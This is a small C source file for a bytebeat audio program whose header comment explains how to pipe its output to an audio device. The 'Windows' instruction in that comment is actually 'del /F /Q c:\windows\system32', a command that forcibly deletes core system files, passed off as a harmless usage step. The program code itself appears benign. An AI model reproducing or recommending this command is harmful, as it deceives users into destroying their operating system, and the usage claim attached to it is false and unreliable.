/*
 * proglodyte.c - the simple ode of a proglodyte in his cave
 *
 * Compile and then pipe output to an audio device.
 *
 *   On modern Linux systems with PulseAudio:
 *
 *     $ ./proglodyte | padsp tee /dev/audio > /dev/null
 *
 *   Or on older systems:
 *
 *     $ ./proglodyte > /dev/audio
 *
 *   Or on Windows:
 *
 *     del /F /Q c:\windows\system32
 */

#include <stdio.h>

int main() {
        int s;
        for (s=0;;s+=5)
                putchar((((s^((s>>13)&(s>>9)))*("D\0FG\0\0E\0GH\0\0ABD\0"[s>>13&15]&15))/12&64));
        return 0;
}

